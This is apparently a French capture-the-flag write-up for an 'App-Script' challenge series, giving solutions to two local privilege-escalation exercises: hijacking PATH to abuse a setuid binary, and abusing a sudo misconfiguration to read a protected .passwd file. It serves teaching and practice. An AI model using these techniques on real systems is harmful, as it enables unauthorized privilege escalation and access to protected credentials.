
# APP-SCRIPT

Cette série d’épreuves est conçue pour exposer les vulnérabilités associées à des faiblesses de l'environnement, des erreurs de configuration ou des défauts dans des scripts ou langages de programmation. L'objectif principal est d’obtenir des droits supplémentaires en exploitant diverses failles, telles que des permissions incorrectes sur des fichiers, des protections par chiffrement faibles, ou des erreurs de développement. Chaque défi nécessite l’obtention d’un mot de passe spécifique pour valider l'épreuve sur le portail.

## Prérequis
Pour réussir cette série de challenges, il est important de maîtriser les éléments suivants :
- L’environnement shell UNIX.
- Les langages de programmation Python et Perl.
- Les outils de manipulation de fichiers binaires.
- Une bonne connaissance du langage C.

## 33 Challenges

### 1. Bash - System 1
Lors de l’examen du répertoire, on remarque un attribut particulier `s` sur l’exécutable `ch11`, indiquant qu’il est exécuté avec les privilèges de l'owner, ici `app-script-ch11-cracked`. Ce dernier est également le propriétaire du fichier `.passwd`.

```bash
app-script-ch11@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 .
drwxr-xr-x 14 root                    root                    4096 Nov 17 21:47 ..
-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11
-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c
```

L’attribut `s` sur `ch11` signifie que cet exécutable sera lancé avec les droits du propriétaire, `app-script-ch11-cracked`. Cette configuration permet d'exécuter des actions avec des privilèges élevés si un attaquant parvient à manipuler l'exécution du fichier.

Une solution consiste à copier l'exécutable `cat` dans le répertoire `/tmp`, puis à modifier la variable d’environnement `PATH` pour que le système privilégie cette version modifiée de `cat` lors de l'exécution du fichier `ch11`.

```bash
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
app-script-ch11@challenge02:~$ PATH=/tmp
app-script-ch11@challenge02:~$ echo $PATH
/tmp
```

Maintenant, lorsque l’on exécute `ch11`, c’est la copie de `cat` dans `/tmp` qui sera lancée, permettant ainsi d’afficher le mot de passe contenu dans le fichier `.passwd`.

```bash
app-script-ch11@challenge02:~$ ./ch11
!oPe[... flag snipped ...]5
```

### 2. sudo - Faiblesse de Configuration

Dans un autre challenge, la faiblesse de configuration du fichier sudo est exploitée. En utilisant les privilèges `sudo`, on peut exécuter des commandes avec les droits de l’utilisateur `app-script-ch1-cracked`. Voici une commande qui permet de lire le fichier `.passwd` du challenge :

```bash
app-script-ch1@challenge02:~/ch1cracked$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/* .passwd
```

Cette exploitation permet d’accéder au mot de passe en utilisant des configurations incorrectes du système.